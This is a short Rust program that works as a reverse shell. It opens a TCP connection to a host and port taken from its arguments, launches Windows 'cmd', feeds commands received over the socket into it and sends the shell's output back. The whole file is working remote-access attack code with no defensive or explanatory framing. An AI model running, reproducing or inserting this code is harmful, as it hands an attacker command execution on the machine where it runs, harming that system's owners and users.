use std::{env, io::{BufRead, BufReader, Result, Write}, net::TcpStream, process::{Command, Stdio}, thread};

fn main() -> Result<()> {
    let args: Vec<String> = env::args().collect();
    let addr = &args[1];
    let port = &args[2];

    let conn = TcpStream::connect(format!("{}:{}", addr, port))?;
    println!("Connected to {}:{}", addr, port);

    let reader = BufReader::new(&conn);

    let mut child = Command::new("cmd")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped()).spawn()?;

    let mut stdin = child.stdin.take().unwrap();
    let stdout = child.stdout.take().unwrap();
    let _stderr = child.stderr.take().unwrap();

    // stdout thread
    let stdout_conn = conn.try_clone()?;
    thread::spawn(move || {
        let reader = BufReader::new(stdout);
        let mut conn_clone = stdout_conn.try_clone().unwrap();
        for line in reader.lines() {
            conn_clone.write_all(format!("{}\n", line.unwrap()).as_bytes()).unwrap();
        }
    });

    for cmd in reader.lines() {
        let accepted_cmd = format!("{}\n \n", cmd?);

        stdin.write_all(accepted_cmd.as_bytes())?;
    }


    Ok(())
}
